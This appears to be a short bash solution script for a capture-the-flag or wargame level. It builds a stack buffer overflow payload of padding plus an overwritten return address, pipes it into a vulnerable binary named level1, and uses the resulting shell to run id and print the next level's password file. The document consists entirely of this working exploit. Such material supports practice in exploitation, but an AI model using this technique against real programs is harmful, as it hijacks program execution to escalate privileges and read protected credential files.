#!/bin/bash

GETPASS="cat /home/user/level2/.pass"

set -x

python -c 'print("A" * 76 + "\x44\x84\x04\x08")' > /tmp/exploit1

(cat /tmp/exploit1 - | ./level1) << EOI
    echo "\nid: \$(id)"
    echo "Next pass is: \$($GETPASS)\n"
EOI
